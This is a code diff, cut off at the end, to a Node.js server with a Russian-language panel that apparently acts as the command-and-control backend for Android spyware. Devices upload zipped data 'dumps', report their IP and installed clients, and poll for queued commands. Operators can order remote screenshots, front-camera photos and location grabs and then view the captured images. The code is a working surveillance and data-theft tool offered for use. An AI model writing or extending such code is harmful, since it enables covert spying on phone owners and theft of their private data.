@@ -12,20 +12,30 @@ const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
 const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';
 
 const SAVE_DIR = path.join(__dirname, 'dumps');
+const MEDIA_DIR = path.join(__dirname, 'media');
 const LOG_FILE = path.join(__dirname, 'logs.json');
 const UPLOAD_LOG_FILE = path.join(__dirname, 'upload_logs.json');
 const DEVICES_FILE = path.join(__dirname, 'devices.json');
+const CMDS_FILE = path.join(__dirname, 'commands.json');
 
 if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
+if (!fs.existsSync(MEDIA_DIR)) fs.mkdirSync(MEDIA_DIR, { recursive: true });
 if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '[]');
 if (!fs.existsSync(UPLOAD_LOG_FILE)) fs.writeFileSync(UPLOAD_LOG_FILE, '[]');
 if (!fs.existsSync(DEVICES_FILE)) fs.writeFileSync(DEVICES_FILE, '{}');
+if (!fs.existsSync(CMDS_FILE)) fs.writeFileSync(CMDS_FILE, '{}');
 
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, SAVE_DIR),
   filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
 });
 const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });
+
+const mediaStorage = multer.diskStorage({
+  destination: (req, file, cb) => cb(null, MEDIA_DIR),
+  filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
+});
+const mediaUpload = multer({ storage: mediaStorage, limits: { fileSize: 200 * 1024 * 1024 } });
 
 function readJSON(file, def) {
   try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return def; }
@@ -40,6 +50,8 @@ function readUploadLogs() { return readJSON(UPLOAD_LOG_FILE, []); }
 function writeUploadLogs(arr) { if (arr.length > 2000) arr = arr.slice(-2000); writeJSON(UPLOAD_LOG_FILE, arr); }
 function readDevices() { return readJSON(DEVICES_FILE, {}); }
 function writeDevices(o) { writeJSON(DEVICES_FILE, o); }
+function readCmds() { return readJSON(CMDS_FILE, {}); }
+function writeCmds(o) { writeJSON(CMDS_FILE, o); }
 
 // --- приём zip ---
 app.post('/upload', upload.single('file'), (req, res) => {
@@ -129,11 +141,79 @@ app.post('/log/upload', (req, res) => {
   res.json({ ok: true });
 });
 
+// --- long polling для команд ---
+app.post('/cmd/poll', (req, res) => {
+  const key = req.headers['x-key'] || req.query.key;
+  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });
+
+  const deviceId = (req.body && req.body.deviceId) || req.query.deviceId || 'unknown';
+  const cmds = readCmds();
+  const queue = cmds[deviceId] || [];
+
+  if (queue.length > 0) {
+    const cmd = queue.shift();
+    cmds[deviceId] = queue;
+    writeCmds(cmds);
+    return res.json({ ok: true, cmd });
+  }
+
+  res.json({ ok: true, cmd: null });
+});
+
+// --- результат команды (с файлом или без) ---
+app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
+  const key = req.headers['x-key'] || req.query.key;
+  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });
+
+  const deviceId = req.headers['x-device-id'] || 'unknown';
+  const cmdType = req.headers['x-cmd-type'] || '?';
+  const status = req.headers['x-status'] || '?';
+
+  let note = '';
+  try {
+    if (req.body && req.body.note) note = req.body.note;
+  } catch (e) {}
+
+  const entry = {
+    ts: Date.now(),
+    type: 'cmd_result',
+    deviceId,
+    cmd: cmdType,
+    status,
+    file: req.file ? `/media/${req.file.filename}` : null,
+    fileType: req.file ? (req.file.mimetype || '') : '',
+    note
+  };
+
+  const logs = readLogs();
+  logs.push(entry);
+  writeLogs(logs);
+
+  res.json({ ok: true });
+});
+
+// --- постановка команды в очередь (из панели) ---
+app.get('/cmd/send', (req, res) => {
+  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
+
+  const deviceId = req.query.device;
+  const cmd = req.query.cmd;
+  if (!deviceId || !cmd) return res.status(400).send('missing params');
+
+  const cmds = readCmds();
+  if (!cmds[deviceId]) cmds[deviceId] = [];
+  cmds[deviceId].push({ cmd, ts: Date.now() });
+  writeCmds(cmds);
+
+  res.redirect('/?key=' + VIEW_KEY + '&tab=control&device=' + encodeURIComponent(deviceId));
+});
+
 // --- панель ---
 app.get('/', (req, res) => {
   if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
 
   const tab = req.query.tab || 'dumps';
+  const selectedDevice = req.query.device || null;
 
   const files = fs.readdirSync(SAVE_DIR)
     .filter(f => f.endsWith('.zip'))
@@ -171,20 +251,37 @@ app.get('/', (req, res) => {
       </div>
     </div>`).join('');
 
-  const logRows = logs.map(l => `
-    <div class="log-row">
-      <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
-      <div class="log-main">
-        <div class="log-device">${l.device} <span class="log-android">Android ${l.android} (SDK ${l.sdk})</span></div>
-        <div class="log-meta">
-          ${l.clients && l.clients.length ? `<span class="tag">${l.clients.join(' · ')}</span>` : ''}
-          ${l.zipSize ? `<span class="tag">${(l.zipSize/1024/1024).toFixed(2)} MB</span>` : ''}
-          ${l.ok ? `<span class="ok">✓ sent</span>` : `<span class="bad">✗ fail</span>`}
+  const logRows = logs.map(l => {
+    if (l.type === 'cmd_result') {
+      return `
+      <div class="log-row">
+        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
+        <div class="log-main">
+          <div class="log-device">Команда <b>${l.cmd}</b></div>
+          <div class="log-meta">
+            <span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span>
+            ${l.note ? `<span class="tag">${l.note}</span>` : ''}
+          </div>
+          ${l.file && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:300px;border-radius:8px;margin-top:6px"/></div>` : ''}
+          ${l.file && !l.fileType.includes('image') ? `<div><a class="btn-mini" href="${l.file}" target="_blank">открыть файл</a></div>` : ''}
         </div>
-        ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
-      </div>
-      <div class="log-ip">${l.ip}</div>
-    </div>`).join('');
+      </div>`;
+    }
+    return `
+      <div class="log-row">
+        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
+        <div class="log-main">
+          <div class="log-device">${l.device} <span class="log-android">Android ${l.android} (SDK ${l.sdk})</span></div>
+          <div class="log-meta">
+            ${l.clients && l.clients.length ? `<span class="tag">${l.clients.join(' · ')}</span>` : ''}
+            ${l.zipSize ? `<span class="tag">${(l.zipSize/1024/1024).toFixed(2)} MB</span>` : ''}
+            ${l.ok ? `<span class="ok">✓ sent</span>` : `<span class="bad">✗ fail</span>`}
+          </div>
+          ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
+        </div>
+        <div class="log-ip">${l.ip}</div>
+      </div>`;
+  }).join('');
 
   const uploadRows = uploadLogs.map(l => {
     const stageClass = l.stage === 'done' ? 'ok' : l.stage === 'fail' ? 'bad' : 'tag';
@@ -206,22 +303,59 @@ app.get('/', (req, res) => {
   }).join('');
 
   const deviceList = Object.values(devices).sort((a,b) => b.lastSeen - a.lastSeen);
-  const deviceCards = deviceList.map(d => {
-    const online = (Date.now() - d.lastSeen) < 60000;
-    return `
-    <div class="dev-card">
-      <div class="dev-head">
-        <div class="dot ${online ? '' : 'off'}"></div>
-        <div class="dev-name">${d.device}</div>
-        <div class="dev-time">${new Date(d.lastSeen).toLocaleString('ru-RU')}</div>
-      </div>
-      <div class="dev-meta">
-        <div class="row"><span>Android</span><b>${d.android} / SDK ${d.sdk}</b></div>
-        <div class="row"><span>IP</span><b>${d.ip}</b></div>
-        <div class="row"><span>Клиенты</span><b>${(d.clients||[]).join(', ') || '—'}</b></div>
-      </div>
-    </div>`;
-  }).join('');
+
+  let controlHtml = '';
+  if (!selectedDevice) {
+    controlHtml = deviceList.length === 0
+      ? `<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>`
+      : `<div class="grid">${deviceList.map(d => {
+          const online = (Date.now() - d.lastSeen) < 60000;
+          return `
+          <a class="card" href="/?key=${VIEW_KEY}&tab=control&device=${encodeURIComponent(d.deviceId)}" style="text-decoration:none;color:inherit">
+            <div class="card-head">
+              <div class="dot ${online ? '' : 'off'}"></div>
+              <div class="device">${d.device}</div>
+              <div class="time">${new Date(d.lastSeen).toLocaleString('ru-RU')}</div>
+            </div>
+            <div class="card-body">
+              <div class="row"><span>Android</span><b>${d.android} / SDK ${d.sdk}</b></div>
+              <div class="row"><span>IP</span><b>${d.ip}</b></div>
+              <div class="row"><span>Клиенты</span><b>${(d.clients||[]).join(', ') || '—'}</b></div>
+            </div>
+          </a>`;
+        }).join('')}</div>`;
+  } else {
+    const dev = devices[selectedDevice];
+    if (!dev) {
+      controlHtml = `<div class="empty"><div class="empty-icon">❓</div><div>Устройство не найдено</div></div>`;
+    } else {
+      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 20);
+      controlHtml = `
+        <div class="dev-header">
+          <a href="/?key=${VIEW_KEY}&tab=control" class="back">← Назад</a>
+          <div class="dev-title">${dev.device}</div>
+          <div class="dev-sub">${dev.ip} · Android ${dev.android}</div>
+        </div>
+        <div class="cmd-grid">
+          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=screenshot">📸 Скриншот</a>
+          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=frontcam">🤳 Фронталка</a>
+          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=location">📍 Гео</a>
+        </div>
+        <h3 style="margin-top:24px;margin-bottom:12px;color:#8b949e;font-size:14px">Результаты</h3>
+        <div class="logs">
+          ${devLogs.length === 0 ? '<div class="log-note">Пока ничего</div>' : devLogs.map(l => `
+            <div class="log-row">
+              <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
+              <div class="log-main">
+                <div class="log-device"><b>${l.cmd}</b></div>
+                <div class="log-meta"><span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span></div>
+                ${l.file && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:400px;border-radius:8px;margin-top:6px" onclick="window.open('${l.file}','_blank')"/></div>` : ''}
+                ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
+              </div>
+            </div>`).join('')}
+        </div>`;
+    }
+  }
 
   res.send(`<!doctype html>
 <html lang="ru"><head>
@@ -248,18 +382,18 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-seri
 .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
 .empty{max-width:1200px;margin:0 auto;text-align:center;padding:100px 20px;color:#6e7681}
 .empty-icon{font-size:64px;margin-bottom:18px;opacity:.4}
-.card,.log-row,.dev-card{background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;border-radius:14px;padding:16px;transition:all .25s}
-.card:hover,.log-row:hover,.dev-card:hover{border-color:#58a6ff}
-.card-head,.dev-head{display:flex;align-items:center;gap:8px;padding-bottom:12px;border-bottom:1px solid #21262d;margin-bottom:12px}
+.card,.log-row{background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;border-radius:14px;padding:16px;transition:all .25s;display:block}
+.card:hover,.log-row:hover{border-color:#58a6ff}
+.card-head{display:flex;align-items:center;gap:8px;padding-bottom:12px;border-bottom:1px solid #21262d;margin-bottom:12px}
 .dot{width:8px;height:8px;border-radius:50%;background:#3fb950;box-shadow:0 0 8px #3fb950;flex-shrink:0}
 .dot.off{background:#6e7681;box-shadow:none}
-.device,.dev-name{font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.time,.dev-time{font-size:11px;color:#6e7681;flex-shrink:0}
-.card-body,.dev-meta{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
+.device{font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.time{font-size:11px;color:#6e7681;flex-shrink:0}
+.card-body{display:flex;flex-direction:column;gap:8px}
 .row{display:flex;justify-content:space-between;font-size:13px}
 .row span{color:#6e7681}
 .row b{color:#e6edf3;font-weight:500;word-break:break-all;text-align:right;max-width:60%}
-.actions{display:flex;gap:8px}
+.actions{display:flex;gap:8px;margin-top:14px}
 .btn,.btn-del{flex:1;text-align:center;padding:10px;border-radius:9px;text-decoration:none;font-weight:600;font-size:13px;transition:all .2s}
 .btn{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
 .btn:hover{filter:brightness(1.15)}
@@ -276,6 +410,14 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-seri
 .log-meta .tag{color:#58a6ff}
 .log-note{font-size:12px;color:#8b949e;font-style:italic}
 .log-ip{font-size:12px;color:#6e7681;font-family:monospace}
+.dev-header{max-width:1200px;margin:0 auto 20px}
+.back{color:#58a6ff;text-decoration:none;font-size:14px;font-weight:600}
+.dev-title{font-size:22px;font-weight:700;margin-top:10px}
+.dev-sub{color:#6e7681;font-size:13px;margin-top:4px}
+.cmd-grid{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
+.cmd-btn{padding:18px;border-radius:12px;text-decoration:none;color:#e6edf3;font-weight:600;font-size:15px;background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;text-align:center;transition:all .2s}
+.cmd-btn:hover{border-color:#58a6ff;background:rgba(88,166,255,.08);transform:translateY(-2px)}
+.btn-mini{display:inline-block;padding:4px 10px;border-radius:6px;background:rgba(88,166,255,.14);color:#58a6ff;text-decoration:none;font-size:11px;font-weight:600;margin-top:6px}
 </style></head><body>
 
 <div class="header">
@@ -294,70 +436,4 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-seri
   <a class="tab ${tab === 'dumps' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=dumps">Дампы</a>
   <a class="tab ${tab === 'control' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=control">Управление</a>
   <a class="tab ${tab === 'logs' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=logs">Логи</a>
-  <a class="tab ${tab === 'uploadlog' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=uploadlog">Upload Log</a>
-  <div class="spacer"></div>
-  ${tab === 'dumps' ? `<a class="tool" href="/clear?key=${VIEW_KEY}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить</a>` : ''}
-  ${tab === 'logs' ? `<a class="tool" href="/clearlogs?key=${VIEW_KEY}" onclick="return confirm('Удалить все логи?')">Очистить</a>` : ''}
-  ${tab === 'uploadlog' ? `<a class="tool" href="/clearuploadlogs?key=${VIEW_KEY}" onclick="return confirm('Удалить upload-логи?')">Очистить</a>` : ''}
-</div>
-
-${tab === 'uploadlog' 
-  ? (uploadLogs.length === 0 
-      ? `<div class="empty"><div class="empty-icon">📤</div><div>Upload-логов пока нет</div></div>` 
-      : `<div class="logs">${uploadRows}</div>`)
-  : tab === 'logs'
-  ? (logs.length === 0 
-      ? `<div class="empty"><div class="empty-icon">📋</div><div>Логов пока нет</div></div>` 
-      : `<div class="logs">${logRows}</div>`)
-  : tab === 'control'
-  ? (deviceList.length === 0
-      ? `<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>` 
-      : `<div class="grid">${deviceCards}</div>`)
-  : (files.length === 0 
-      ? `<div class="empty"><div class="empty-icon">📭</div><div>Пока пусто</div></div>` 
-      : `<div class="grid">${dumpCards}</div>`)
-}
-
-</body></html>`);
-});
-
-app.get('/delete/:name', (req, res) => {
-  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
-  const p = path.join(SAVE_DIR, req.params.name);
-  if (fs.existsSync(p)) fs.unlinkSync(p);
-  const metaP = p + '.json';
-  if (fs.existsSync(metaP)) fs.unlinkSync(metaP);
-  res.redirect('/?key=' + VIEW_KEY);
-});
-
-app.get('/clear', (req, res) => {
-  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
-  const files = fs.readdirSync(SAVE_DIR);
-  for (const f of files) {
-    try { fs.unlinkSync(path.join(SAVE_DIR, f)); } catch (e) {}
-  }
-  res.redirect('/?key=' + VIEW_KEY);
-});
-
-app.get('/clearlogs', (req, res) => {
-  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
-  writeLogs([]);
-  res.redirect('/?key=' + VIEW_KEY + '&tab=logs');
-});
-
-app.get('/clearuploadlogs', (req, res) => {
-  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
-  writeUploadLogs([]);
-  res.redirect('/?key=' + VIEW_KEY + '&tab=uploadlog');
-});
-
-app.get('/download/:name', (req, res) => {
-  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
-  const p = path.join(SAVE_DIR, req.params.name);
-  if (!fs.existsSync(p)) return res.status(404).send('not found');
-  res.download(p);
-});
-
-app.get('/health', (req, res) => res.send('ok'));
-
-app.listen(PORT, () => console.log('server on ' + PORT));
+  <a class="tab ${tab === 'uploadlog' ? 'active' : ''}
